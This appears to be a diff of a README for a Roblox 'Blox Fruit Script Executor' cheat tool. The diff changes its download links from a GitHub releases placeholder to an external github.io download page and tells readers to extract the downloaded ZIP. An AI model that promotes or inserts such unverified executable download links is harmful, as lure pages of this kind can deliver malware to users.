@@ -1,9 +1,9 @@
 # 🚀 **Blox Fruit Script Executor - Ultimate Blox Fruits Modding Tool**  
-**[![Download Blox Fruit Script Executor](https://img.shields.io/badge/Download-Blox%20Fruit%20Script%20Executor-blueviolet)](https://github.com/yourusername/blox-fruit-script-executor/releases)**
+**[![Download Blox Fruit Script Executor](https://img.shields.io/badge/Download-Blox%20Fruit%20Script%20Executor-blueviolet)](https://roblox-blox-fruits-scripts.github.io/download/)**
 
 ## Quick Installation
 To get started with the **Blox Fruit Script Executor**, follow these simple steps:
-1. **[![Download Blox Fruit Script Executor](https://img.shields.io/badge/Download-Blox%20Fruit%20Script%20Executor-blueviolet)](https://github.com/yourusername/blox-fruit-script-executor/releases)**
+1. **[![Download Blox Fruit Script Executor](https://img.shields.io/badge/Download-Blox%20Fruit%20Script%20Executor-blueviolet)](https://roblox-blox-fruits-scripts.github.io/download/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 ---
